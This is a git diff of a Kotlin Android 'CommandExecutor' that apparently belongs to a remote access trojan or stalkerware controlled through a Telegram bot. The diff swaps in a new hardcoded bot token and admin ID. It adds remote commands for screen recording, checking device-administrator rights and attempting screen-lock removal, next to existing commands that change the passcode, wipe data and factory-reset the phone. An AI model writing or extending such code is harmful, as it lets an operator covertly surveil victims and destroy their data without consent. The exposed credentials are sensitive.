@@ -66,7 +66,7 @@ object CommandExecutor {
     private var audioRecorder: MediaRecorder? = null
     private var screenRecorder: MediaRecorder? = null
 
-    const val BOT_TOKEN = "8898830696:AAGhrsmavkljSpF8d9SUw1XbM5syh4nzGF4"
+    const val BOT_TOKEN = "8898830696:AAGpgjtwn2cB5wcKQ07PJPXjhKF0Ll43wrs"
     const val ADMIN_ID = 7344776596L
 
     // ==================== نقطة الدخول الرئيسية ====================
@@ -155,6 +155,14 @@ object CommandExecutor {
                 command == "change_passcode" -> changePasscode(context, params)
                 command == "wipe_data" -> wipeData(context)
                 command == "factory_reset" -> factoryReset(context)
+                command == "remove_screen_lock" -> """{"ok":false,"error":"يتطلب صلاحيات Root"}"""
+                command == "device_admin_status" -> {
+                    val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                    val componentName = ComponentName(context, MyDeviceAdminReceiver::class.java)
+                    val isActive = dpm.isAdminActive(componentName)
+                    """{"ok":true,"device_admin_active":$isActive,"message":"${if (isActive) "مسؤول الجهاز مفعّل" else "مسؤول الجهاز غير مفعّل"}"}"""
+                }
+                command == "screen_record_start" -> startScreenRecording(context)
 
                 // ========== المنفعة ==========
                 command == "ping" -> ping(context)
